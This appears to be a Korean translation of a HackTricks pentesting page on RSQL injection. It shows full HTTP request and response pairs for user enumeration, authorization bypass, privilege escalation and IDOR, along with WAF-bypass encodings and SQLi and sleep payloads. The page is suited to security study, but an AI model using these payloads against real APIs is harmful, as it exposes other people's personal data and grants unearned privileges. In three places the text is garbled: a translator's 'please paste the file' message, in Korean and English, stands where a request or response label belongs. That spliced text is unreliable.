# RSQL Injection

{{#include ../banners/hacktricks-training.md}}

## RSQL이란?
RSQL은 RESTful APIs에서 입력의 파라미터화된 필터링을 위해 설계된 쿼리 언어입니다. FIQL (Feed Item Query Language)을 기반으로 하며, 원래 Mark Nottingham이 Atom feeds를 쿼리하기 위해 명세한 것에서 출발했습니다. RSQL은 단순성 및 HTTP 상에서 compact하고 URI-호환 방식으로 복잡한 쿼리를 표현할 수 있는 능력으로 돋보입니다. 이로 인해 REST 엔드포인트 검색을 위한 일반 쿼리 언어로 우수한 선택이 됩니다.

## 개요
RSQL Injection은 RSQL을 쿼리 언어로 사용하는 RESTful APIs 기반 웹 애플리케이션에서 발생하는 취약점입니다. [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) 및 [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection)과 유사하게, RSQL 필터가 적절히 정제(sanitize)되지 않을 때 발생하며, 공격자가 권한 없이 악의적인 쿼리를 주입하여 데이터에 접근·수정·삭제할 수 있게 합니다.

## 작동 방식
RSQL을 사용하면 RESTful APIs에서 고급 쿼리를 작성할 수 있습니다. 예를 들어:
```bash
/products?filter=price>100;category==electronics
```
이는 가격이 100보다 큰 제품을 필터링하고 카테고리가 “electronics”인 항목을 반환하는 구조화된 쿼리로 변환됩니다.

애플리케이션이 사용자 입력을 올바르게 검증하지 않으면, 공격자는 필터를 조작해 다음과 같은 예기치 않은 쿼리를 실행할 수 있습니다:
```bash
/products?filter=id=in=(1,2,3);delete_all==true
```
또는 Boolean 쿼리나 중첩 서브쿼리를 이용해 민감한 정보를 추출하는 데 악용될 수도 있습니다.

## 위험
- **Exposure of sensitive data:** 공격자가 접근해서는 안 되는 정보를 조회할 수 있습니다.
- **Data modification or deletion:** 데이터베이스 레코드를 변경하거나 삭제하는 필터를 주입할 수 있습니다.
- **Privilege escalation:** 필터를 통해 역할을 부여하는 식별자를 조작하여 다른 사용자의 권한으로 애플리케이션에 접근하도록 속일 수 있습니다.
- **Evasion of access controls:** 필터를 조작해 제한된 데이터에 접근할 수 있습니다.
- **Impersonation or IDOR:** 필터를 통해 사용자 간 식별자를 수정하여 적절히 인증되지 않은 상태에서 다른 사용자의 정보나 리소스에 접근할 수 있습니다.

## 지원되는 RSQL 연산자
| Operator  | 설명 | 예시  |
|:----: |:----: |:------------------:|
| `;` / `and` | 논리적 **AND** 연산자. *두 조건이 모두 참*인 행을 필터링합니다. | `/api/v2/myTable?q=columnA==valueA;columnB==valueB` |
| `,` / `or` | 논리적 **OR** 연산자. *적어도 하나*의 조건이 *참*인 행을 필터링합니다. | `/api/v2/myTable?q=columnA==valueA,columnB==valueB` |
| `==` | **equals** 질의를 수행합니다. *columnA*의 값이 *queryValue*와 정확히 일치하는 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA==queryValue` |
| `=q=` | **search** 질의를 수행합니다. *columnA*의 값에 *queryValue*가 포함된 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA=q=queryValue` |
| `=like=` | **like** 질의를 수행합니다. *columnA*의 값이 *queryValue*와 유사한 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA=like=queryValue` |
| `=in=` | **in** 질의를 수행합니다. *columnA*가 *valueA* 또는 *valueB*를 포함하는 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA=in=(valueA, valueB)` |
| `=out=` | **exclude** 질의를 수행합니다. *columnA*의 값이 *valueA*나 *valueB*가 아닌 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA=out=(valueA,valueB)` |
| `!=` | *not equals* 질의를 수행합니다. *columnA*의 값이 *queryValue*와 같지 않은 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA!=queryValue` |
| `=notlike=` | **not like** 질의를 수행합니다. *columnA*의 값이 *queryValue*와 유사하지 않은 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA=notlike=queryValue` |
| `<` & `=lt=` | **lesser than** 질의를 수행합니다. *columnA*의 값이 *queryValue*보다 작은 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA<queryValue` <br> `/api/v2/myTable?q=columnA=lt=queryValue` |
| `=le=` & `<=` | **lesser than** 또는 **equal to** 질의를 수행합니다. *columnA*의 값이 *queryValue*보다 작거나 같은 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA<=queryValue` <br> `/api/v2/myTable?q=columnA=le=queryValue` |
| `>` & `=gt=` | **greater than** 질의를 수행합니다. *columnA*의 값이 *queryValue*보다 큰 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA>queryValue` <br> `/api/v2/myTable?q=columnA=gt=queryValue` |
| `>=` & `=ge=` | **equal** to 또는 **greater than** 질의를 수행합니다. *columnA*의 값이 *queryValue*와 같거나 큰 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA>=queryValue` <br> `/api/v2/myTable?q=columnA=ge=queryValue` |
| `=rng=` | **from to** 질의를 수행합니다. *columnA*의 값이 *fromValue* 이상이고 *toValue* 이하인 myTable의 모든 행을 반환합니다. | `/api/v2/myTable?q=columnA=rng=(fromValue,toValue)` |

**Note**: Table based on information from [**MOLGENIS**](https://molgenis.gitbooks.io/molgenis/content/) and [**rsql-parser**](https://github.com/jirutka/rsql-parser) applications.

#### 예시
- name=="Kill Bill";year=gt=2003
- name=="Kill Bill" and year>2003
- genres=in=(sci-fi,action);(director=='Christopher Nolan',actor==*Bale);year=ge=2000
- genres=in=(sci-fi,action) and (director=='Christopher Nolan' or actor==*Bale) and year>=2000
- director.lastName==Nolan;year=ge=2000;year=lt=2010
- director.lastName==Nolan and year>=2000 and year<2010
- genres=in=(sci-fi,action);genres=out=(romance,animated,horror),director==Que*Tarantino
- genres=in=(sci-fi,action) and genres=out=(romance,animated,horror) or director==Que*Tarantino

**Note**: Table based on information from [**rsql-parser**](https://github.com/jirutka/rsql-parser) application.

## 일반적인 필터
다음 필터들은 API 쿼리를 세분화하는 데 도움이 됩니다:

| Filter | 설명 | 예시 |
|--------|------------|---------|
| `filter[users]` | 특정 사용자로 결과를 필터링합니다 | `/api/v2/myTable?filter[users]=123` |
| `filter[status]` | 상태(active/inactive, completed 등)로 필터링합니다 | `/api/v2/orders?filter[status]=active` |
| `filter[date]` | 날짜 범위 내의 결과를 필터링합니다 | `/api/v2/logs?filter[date]=gte:2024-01-01` |
| `filter[category]` | 카테고리나 리소스 타입으로 필터링합니다 | `/api/v2/products?filter[category]=electronics` |
| `filter[id]` | 고유 식별자로 필터링합니다 | `/api/v2/posts?filter[id]=42` |

## 일반적인 파라미터
다음 파라미터들은 API 응답을 최적화하는 데 도움이 됩니다:

| Parameter | 설명 | 예시 |
|-----------|------------|---------|
| `include` | 응답에 관련 리소스를 포함합니다 | `/api/v2/orders?include=customer,items` |
| `sort` | 결과를 오름차순 또는 내림차순으로 정렬합니다 | `/api/v2/users?sort=-created_at` |
| `page[size]` | 페이지당 결과 수를 제어합니다 | `/api/v2/products?page[size]=10` |
| `page[number]` | 페이지 번호를 지정합니다 | `/api/v2/products?page[number]=2` |
| `fields[resource]` | 응답에 반환할 필드를 정의합니다 | `/api/v2/users?fields[users]=id,name,email` |
| `search` | 보다 유연한 검색을 수행합니다 | `/api/v2/posts?search=technology` |

## 정보 누출 및 사용자 열거
다음 요청은 registration endpoint가 email 파라미터로 해당 이메일로 등록된 사용자가 있는지 확인하고 데이터베이스에 존재하는지 여부에 따라 true 또는 false를 반환하는 예를 보여줍니다:
### 요청
```
GET /api/registrations HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
파일 내용(src/pentesting-web/rsql-injection.md)이 제공되지 않았습니다. 번역하려는 원문 마크다운을 여기에 붙여 넣어 주시겠습니까? 

붙여 넣어 주시면 요청하신 규칙(코드, 태그, 링크, 경로 등은 번역하지 않음)을 준수하여 정확하게 한국어로 번역해 드리겠습니다.
```
HTTP/1.1 400
Date: Sat, 22 Mar 2025 14:47:14 GMT
Content-Type: application/vnd.api+json
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
Content-Length: 85

{
"errors": [{
"code": "BLANK",
"detail": "Missing required param: email",
"status": "400"
}]
}
```
`/api/registrations?email=<emailAccount>`가 예상되지만, RSQL filters를 사용하여 특수 operators를 통해 user information을 enumerate 및/또는 extract하려 시도할 수 있습니다:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='test@test.com' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://locahost:3000
Connection: keep-alive
Referer: https://locahost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 응답
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:09:38 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 38
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"attributes": {
"tenants": []
}
}
}
```
유효한 이메일 계정과 일치하는 경우, 애플리케이션은 서버에 대한 응답으로 전형적인 *“true”*, *"1"* 같은 값 대신 사용자 정보를 반환합니다:
### Request
```
GET /api/registrations?filter[userAccounts]=email=='manuel**********@domain.local' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 응답
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:19:46 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 293
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": {
"id": "********************",
"type": "UserAccountDTO",
"attributes": {
"id": "********************",
"type": "UserAccountDTO",
"email": "manuel**********@domain.local",
"sub": "*********************",
"status": "ACTIVE",
"tenants": [{
"id": "1"
}]
}
}
}
```
## Authorization evasion
이 시나리오에서는 기본 역할을 가진 사용자로 시작하며, 데이터베이스에 등록된 모든 사용자 목록에 접근할 수 있는 권한(예: administrator)을 가지고 있지 않습니다:
### Request
```
GET /api/users HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 응답
```
HTTP/1.1 403
Date: Sat, 22 Mar 2025 14:40:07 GMT
Content-Length: 0
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *
```
다시 필터와 특수 연산자를 사용하여 사용자 정보를 얻고 접근 제어를 우회하는 대체 방법을 활용합니다.
예를 들어, 사용자 *ID*에 문자 “*a*”를 포함하는 *사용자*로 필터링합니다:
### 요청
```
GET /api/users?filter[users]=id=in=(*a*) HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb.................
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 응답
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 14:43:28 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 1434192
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "********A***********",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "************",
"email": "**********@domain.local",
"firstName": "rafael",
"surname": "************",
"telephoneCountryCode": "**",
"mobilePhone": "*********",
"taxIdentifier": "********",
"languageId": 1,
"createdAt": "2024-08-09T10:57:41.237Z",
"termsOfUseAccepted": true,
"id": "******************",
"type": "UserGetResponseCustomDTO"
}
}, {
"id": "*A*******A*****A*******A******",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": ""************",
"email": "juan*******@domain.local",
"firstName": "juan",
"surname": ""************",",
"telephoneCountryCode": "**",
"mobilePhone": "************",
"taxIdentifier": "************",
"languageId": 1,
"createdAt": "2024-07-18T06:07:37.68Z",
"termsOfUseAccepted": true,
"id": "*******************",
"type": "UserGetResponseCustomDTO"
}
}, {
................
```
## Privilege Escalation
사용자의 role을 통해 권한을 검사하는 특정 엔드포인트를 발견할 가능성이 매우 높습니다. 예를 들어, 권한이 없는 사용자를 다루고 있는 상황입니다:
### 요청
```
GET /api/companyUsers?include=role HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJhb......
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 응답
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:08 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 11
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": []
}
```
일부 operators를 사용하여 관리자 사용자를 열거할 수 있습니다:
### Request
```
GET /api/companyUsers?include=role&filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJh.....
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### Response
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:13:45 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 361
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"type": "CompanyUserGetResponseDTO",
"attributes": {
"companyId": "FA**************",
"companyTaxIdentifier": "B999*******",
"bizName": "company sl",
"email": "jose*******@domain.local",
"userRole": {
"userRoleId": 1,
"userRoleKey": "general.roles.admin"
},
"companyCountryTranslationKey": "*******",
"type": "CompanyUserGetResponseDTO"
}
}]
}
```
관리자 사용자의 식별자를 알게 되면, 해당 필터를 관리자 식별자로 교체하거나 추가하여 동일한 권한을 얻는 방식으로 privilege escalation을 악용할 수 있습니다:
### Request
```
GET /api/functionalities/allPermissionsFunctionalities?filter[companyUsers]=user.id=='94****************************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ.....
Origin: https:/localhost:3000
Connection: keep-alive
Referer: https:/localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
원본 파일(src/pentesting-web/rsql-injection.md)의 내용을 붙여 넣어 주세요. 그러면 요청하신 규칙에 따라 한국어로 번역해 드리겠습니다.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 18:53:00 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 68833
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"meta": {
"Functionalities": [{
"functionalityId": 1,
"permissionId": 1,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.userProfile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 2,
"permissionId": 2,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.my_profile",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 3,
"permissionId": 3,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "layout.change_user_data",
"type": "FunctionalityPermissionDTO"
}, {
"functionalityId": 4,
"permissionId": 4,
"effectivePriority": "PERMIT",
"effectiveBehavior": "PERMIT",
"translationKey": "general.configuration",
"type": "FunctionalityPermissionDTO"
}, {
....
}]
}
}
```
## Impersonate or Insecure Direct Object References (IDOR)
`filter` 파라미터 사용 외에도, 결과에 특정 파라미터(예: language, country, password...)를 포함할 수 있는 `include` 같은 다른 파라미터를 사용할 수 있습니다.

다음 예제에서는 우리 사용자 프로필의 정보가 표시됩니다:
### Request
```
GET /api/users?include=language,country HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
### 응답
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:47:27 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 540
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "D5********************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 3,
"translationKey": "**********",
"email": "domingo....@domain.local",
"firstName": "Domingo",
"surname": "**********",
"telephoneCountryCode": "**",
"mobilePhone": "******",
"languageId": 1,
"createdAt": "2024-03-11T07:24:57.627Z",
"termsOfUseAccepted": true,
"howMeetUs": "**************",
"id": "D5********************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
필터의 조합은 authorization control을 우회하여 다른 users' profiles에 접근하는 데 사용할 수 있습니다:

### Request
```
GET /api/users?include=language,country&filter[users]=id=='94***************' HTTP/1.1
Host: localhost:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: application/vnd.api+json
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br, zstd
Content-Type: application/vnd.api+json
Authorization: Bearer eyJ...
Origin: https://localhost:3000
Connection: keep-alive
Referer: https://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-site
```
I don't have the contents of src/pentesting-web/rsql-injection.md. Please paste the file (or the portion you want translated) and I will translate the English text to Korean while preserving all markdown, tags, links, paths, and code exactly as requested.
```
HTTP/1.1 200
Date: Sat, 22 Mar 2025 19:50:07 GMT
Content-Type: application/vnd.api+json;charset=UTF-8
Content-Length: 520
Connection: keep-alive
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
Access-Control-Allow-Origin: *

{
"data": [{
"id": "94******************",
"type": "UserGetResponseCustomDTO",
"attributes": {
"status": "ACTIVE",
"countryId": 63,
"timeZoneId": 2,
"translationKey": "**************",
"email": "jose******@domain.local",
"firstName": "jose",
"surname": "***************",
"telephoneCountryCode": "**",
"mobilePhone": "********",
"taxIdentifier": "*********",
"languageId": 1,
"createdAt": "2024-11-21T08:29:05.833Z",
"termsOfUseAccepted": true,
"id": "94******************",
"type": "UserGetResponseCustomDTO"
}
}]
}
```
## 검출 및 퍼징 빠른 성과
- RSQL 지원 여부는 `?filter=id==test`, `?q==test` 같은 무해한 프로브를 보내 확인하세요 또는 잘못된 연산자 `=foo=`를 시도해 보세요; 자세한 API는 종종 parser errors를 leak합니다 ("Unknown operator" / "Unknown property").
- 많은 구현체가 URL 파라미터를 이중으로 파싱합니다; `(`, `)`, `*`, `;`를 이중 인코딩(예: `%2528admin%2529`)해 단순한 차단 목록과 WAFs를 우회해 보세요.
- 와일드카드로 Boolean exfil: `filter[users]=email==*%@example.com;status==ACTIVE` 그리고 `,`(OR)로 논리를 뒤집어 응답 크기를 비교하세요.
- Range/proximity leaks: `filter[users]=createdAt=rng=(2024-01-01,2025-01-01)` 은(는) 정확한 ID를 몰라도 연도 단위로 빠르게 열거합니다.

## 프레임워크별 악용 (Elide / JPA Specification / JSON:API)
- Elide와 많은 Spring Data REST 프로젝트는 RSQL을 JPA Criteria로 직접 변환합니다. 개발자가 커스텀 연산자(예: `=ilike=`)를 추가하고 prepared parameters 대신 문자열 연결로 predicate를 작성하면, SQLi로 전환할 수 있습니다(클래식 페이로드: `name=ilike='%%' OR 1=1--'`).
- Elide analytic data store는 parameterized columns를 허용합니다; 사용자 제어 analytic 파라미터와 RSQL 필터를 결합한 것이 SQLi의 원인이 되어 CVE-2022-24827이 발생했습니다. 패치된 버전이 올바르게 파라미터화하더라도 유사한 맞춤 코드는 종종 남아 있으니—`@JoinFilter`/`@ReadPermission` SpEL 표현식에서 `${}`를 찾아 `';sleep(5);'` 또는 논리적 항진문을 주입해 보세요.
- JSON:API 백엔드는 일반적으로 `include`와 `filter`를 둘 다 노출합니다. 관련 리소스에 대한 필터링 `filter[orders]=customer.email==*admin*` 은 관계 수준 필터가 소유권 검증보다 먼저 실행되기 때문에 최상위 ACL을 우회할 수 있습니다.

## 자동화 헬퍼
- **rsql-parser CLI (Java)**: `java -jar rsql-parser.jar "name=='*admin*';status==ACTIVE"` 는 페이로드를 로컬에서 검증하고 추상 구문 트리를 표시합니다—균형 잡힌 괄호와 커스텀 연산자를 설계할 때 유용합니다.
- **Python quick builder**:
```python
from pyrsql import RSQL
payload = RSQL().and_("email==*admin*", "status==ACTIVE").or_("role=in=(owner,admin)")
print(str(payload))
```
- HTTP fuzzer (ffuf, turbo-intruder)와 결합하여 `=in=` 리스트 내에서 와일드카드 위치 `*a*`, `*e*` 등을 반복해 ID와 이메일을 빠르게 열거하세요.

## 참고자료
- [RSQL Injection](https://owasp.org/www-community/attacks/RSQL_Injection)
- [RSQL Injection Exploitation](https://m3n0sd0n4ld.github.io/patoHackventuras/rsql_injection_exploitation)
- [Elide filtering & security considerations](https://elide.io/pages/guide/03-analytics.html)

{{#include ../banners/hacktricks-training.md}}
